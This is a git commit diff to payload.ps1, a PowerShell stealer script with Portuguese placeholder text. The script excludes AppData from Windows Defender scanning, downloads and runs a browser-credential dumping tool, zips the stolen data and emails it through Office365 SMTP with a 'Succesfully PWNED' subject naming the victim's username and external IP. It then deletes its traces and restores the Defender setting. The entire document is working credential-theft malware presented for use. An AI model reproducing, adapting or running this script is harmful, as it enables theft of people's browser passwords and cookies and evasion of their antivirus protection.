946569e249e6783c320682468826e4e8560fa3df
David M <109196954+david26099@users.noreply.github.com>
2022-12-05 07:04:07 -0300

    Update payload.ps1

--- payload.ps1
+++ payload.ps1
@@ -1,32 +1,35 @@
 #Adding windows defender exclusionpath
 Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
-mkdir "$env:appdata\Microsoft\dump"
-Set-Location "$env:appdata\Microsoft\dump"
+mkdir "$env:appdata\Local\dump"
+Set-Location "$env:appdata\Local\dump"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest 'hackbrowser.exe file link' -OutFile "hb.exe"
-.\hb.exe --format json
-Remove-Item -Path "$env:appdata\Microsoft\dump\hb.exe" -Force
+Invoke-WebRequest -Uri "link do seu hackbrowser.exe (pd pegar o link raw do hb no repositorio)" -OutFile "$env:appdata\Local\dump\hb.exe"
+cd $env:appdata\Local\dump\ 
+./hb.exe
+Remove-Item -Path "$env:appdata\Local\dump\hb.exe" -Force
 #Creating A Zip Archive
 Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 #Mailing the output you will need to enable less secure app access on your google account for this to work
 $Message = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("smtp.gmail.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential("your email address", "your email password");
+$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
+$smtp.Credentials = New-Object System.Net.NetworkCredential("seu email de envio", "senha");
 $smtp.EnableSsl = $true
-$Message.From = "your email address"
-$Message.To.Add("your email address")
+$Message.From = "email de envio"
+$Message.To.Add("email de recibimento")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
 $Message.Body = $ComputerName
 $files=Get-ChildItem 
-$Message.Attachments.Add("$env:appdata\Microsoft\dump\dump.zip")
+$Message.Attachments.Add("$env:appdata\Local\dump\dump.zip")
 $smtp.Send($Message)
 $Message.Dispose()
 $smtp.Dispose()
 #Cleanup
 cd "$env:appdata"
-Remove-Item -Path "$env:appdata\Microsoft\dump" -Force -Recurse
+Remove-Item -Path "$env:appdata\Local\dump" -Force -Recurse
 Remove-MpPreference -ExclusionPath "$env:appdata"
+
+
